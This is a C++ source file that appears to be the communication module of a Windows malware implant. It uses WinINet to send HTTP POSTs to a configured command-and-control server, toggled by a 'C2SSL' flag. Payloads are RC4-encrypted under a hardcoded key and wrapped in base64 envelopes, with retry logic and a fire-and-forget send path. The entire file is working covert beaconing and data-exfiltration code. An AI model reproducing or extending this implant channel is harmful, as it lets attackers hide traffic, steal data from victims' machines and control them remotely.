#include "communication.h"
#include "config.h"
#include "../utils/encoding.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <vector>
#include <iostream>
#include <exception>

#pragma comment(lib, "wininet.lib")

namespace Core {
namespace Communication {

    // Internal RC4 helper functions
    static void rc4_init(unsigned char* s, const unsigned char* key, int keylen) {
        for (int i = 0; i < 256; ++i) s[i] = i;
        int j = 0;
        for (int i = 0; i < 256; ++i) {
            j = (j + s[i] + key[i % keylen]) & 0xFF;
            std::swap(s[i], s[j]);
        }
    }

    static void rc4_crypt(unsigned char* s, unsigned char* data, int len) {
        int i = 0, j = 0;
        for (int k = 0; k < len; ++k) {
            i = (i + 1) & 0xFF;
            j = (j + s[i]) & 0xFF;
            std::swap(s[i], s[j]);
            data[k] ^= s[(s[i] + s[j]) & 0xFF];
        }
    }

    bool HttpPost(const std::string& jsonBody, std::string& response) {
        HINTERNET hSession = InternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hSession) {
            PRINTF("[ERROR] InternetOpenA failed: %d\n", GetLastError());
            return false;
        }

        HINTERNET hConnect = InternetConnectA(hSession, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            PRINTF("[ERROR] InternetConnectA failed: %d\n", GetLastError());
            InternetCloseHandle(hSession);
            return false;
        }

        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_KEEP_CONNECTION;
        if (C2SSL) flags |= INTERNET_FLAG_SECURE;

        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", API_ENDPOINT, NULL, NULL, NULL, flags, 0);
        if (!hRequest) {
            PRINTF("[ERROR] HttpOpenRequestA failed: %d\n", GetLastError());
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return false;
        }

        const char* headers = "Content-Type: application/json; utf-8";
        BOOL sendResult = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), 
                                          (LPVOID)jsonBody.c_str(), (DWORD)jsonBody.size());
        if (!sendResult) {
            PRINTF("[ERROR] HttpSendRequestA failed: %d\n", GetLastError());
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return false;
        }

        // Read the response
        char buffer[1024];
        DWORD bytesRead = 0;
        std::string resp;

        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            resp.append(buffer);
        }

        response = resp;

        // Cleanup handles
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        
        PRINTF("[DEBUG] HTTP POST successful, response length: %zu\n", response.length());
        return true;
    }

    bool SendHttpPost(const std::string& jsonBody, std::string& response) {
        int attempts = 0;
        bool success = false;
        
        while (attempts < MAX_RETRIES && !success) {
            if (HttpPost(jsonBody, response)) {
                success = true;
            }
            else {
                attempts++;
                if (attempts < MAX_RETRIES) {
                    PRINTF("[WARNING] HTTP POST failed (attempt %d/%d). Retrying in %d ms...\n", 
                           attempts, MAX_RETRIES, RETRY_SLEEP);
                    Sleep(RETRY_SLEEP);
                }
            }
        }
        
        if (!success) {
            PRINTF("[ERROR] HTTP POST failed after %d attempts\n", MAX_RETRIES);
        }
        
        return success;
    }

    std::string Rc4Encrypt(const std::string& input, const std::string& key) {
        if (input.empty() || key.empty()) {
            PRINTF("[ERROR] RC4: Input or key is empty\n");
            return "";
        }

        std::vector<unsigned char> S(256);
        rc4_init(S.data(), (const unsigned char*)key.data(), key.size());
        
        std::string output = input;
        rc4_crypt(S.data(), (unsigned char*)output.data(), output.size());
        
        return output;
    }

    bool SendEncryptedRequest(const json& innerPayload, json& outUnwrappedResponse) {
        try {
            // 1) Serialize and encrypt the payload
            std::string clear = innerPayload.dump();
            PRINTF("[DEBUG] Sending payload: %s\n", clear.c_str());
            
            std::string cipher = Rc4Encrypt(clear, RC4_KEY);
            if (cipher.empty()) {
                PRINTF("[ERROR] RC4 encryption failed\n");
                return false;
            }
            
            std::string b64 = Utils::Encoding::base64_encode(cipher);
            json transport = { {"d", b64} };
            std::string reqBody = transport.dump();

            // 2) Send over HTTP
            std::string rawResp;
            if (!SendHttpPost(reqBody, rawResp)) {
                PRINTF("[ERROR] HTTP POST failed\n");
                return false;
            }

            PRINTF("[DEBUG] Raw server response: %s\n", rawResp.c_str());

            // 3) Parse transport envelope
            json outer;
            try {
                outer = json::parse(rawResp);
            }
            catch (const json::exception& e) {
                PRINTF("[ERROR] Failed to parse server response as JSON: %s\n", e.what());
                return false;
            }

            // Check if 'd' field exists
            if (!outer.contains("d")) {
                PRINTF("[ERROR] Server response doesn't contain 'd' field\n");
                return false;
            }

            // 4) Base64-decode and RC4-decrypt
            std::string respB64 = outer["d"].get<std::string>();
            std::string respCipher;
            try {
                respCipher = Utils::Encoding::base64_decode(respB64);
            }
            catch (const std::exception& e) {
                PRINTF("[ERROR] Failed to base64 decode response: %s\n", e.what());
                return false;
            }

            std::string respClear = Rc4Decrypt(respCipher, RC4_KEY);
            if (respClear.empty()) {
                PRINTF("[ERROR] RC4 decryption failed\n");
                return false;
            }
            
            PRINTF("[DEBUG] Decrypted response: %s\n", respClear.c_str());

            // 5) Parse intermediate JSON
            json intermediate;
            try {
                intermediate = json::parse(respClear);
            }
            catch (const json::exception& e) {
                PRINTF("[ERROR] Failed to parse decrypted response as JSON: %s\n", e.what());
                return false;
            }

            // Check if the decrypted JSON has a 'data' field (additional layer)
            if (intermediate.contains("data")) {
                // This is the additional layer - we need to base64 decode the 'data' field
                std::string dataB64 = intermediate["data"].get<std::string>();
                std::string dataStr;
                try {
                    dataStr = Utils::Encoding::base64_decode(dataB64);
                }
                catch (const std::exception& e) {
                    PRINTF("[ERROR] Failed to base64 decode data field: %s\n", e.what());
                    return false;
                }

                // Finally parse the actual response
                try {
                    outUnwrappedResponse = json::parse(dataStr);
                    PRINTF("[DEBUG] Final parsed response: %s\n", outUnwrappedResponse.dump().c_str());
                }
                catch (const json::exception& e) {
                    PRINTF("[ERROR] Failed to parse data content as JSON: %s\n", e.what());
                    return false;
                }
            }
            else {
                // No additional layer, just use the decrypted JSON directly
                outUnwrappedResponse = intermediate;
            }

            return true;
        }
        catch (const std::exception& e) {
            PRINTF("[ERROR] Unhandled exception in SendEncryptedRequest: %s\n", e.what());
            return false;
        }
    }

    bool PostEncryptedFireAndForget(const json& innerPayload) {
        try {
            std::string clear = innerPayload.dump();
            PRINTF("[DEBUG] Fire-and-forget payload: %s\n", clear.c_str());
            
            std::string cipher = Rc4Encrypt(clear, RC4_KEY);
            if (cipher.empty()) {
                PRINTF("[ERROR] RC4 encryption failed in fire-and-forget\n");
                return false;
            }
            
            std::string b64 = Utils::Encoding::base64_encode(cipher);
            json transport = { {"d", b64} };

            // Create a dummy response string since we don't care about the response
            std::string dummyResponse;
            bool result = SendHttpPost(transport.dump(), dummyResponse);
            
            PRINTF("[DEBUG] Fire-and-forget result: %s\n", result ? "SUCCESS" : "FAILED");
            return result;
        }
        catch (const std::exception& e) {
            PRINTF("[ERROR] Exception in PostEncryptedFireAndForget: %s\n", e.what());
            return false;
        }
    }

    bool Initialize() {
        // Initialize Winsock if needed
        WSADATA wsaData;
        int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (result != 0) {
            PRINTF("[ERROR] WSAStartup failed: %d\n", result);
            return false;
        }
        
        PRINTF("[INFO] Communication subsystem initialized\n");
        return true;
    }

    void Cleanup() {
        // Cleanup Winsock
        WSACleanup();
        PRINTF("[INFO] Communication subsystem cleaned up\n");
    }

} // namespace Communication
} // namespace Core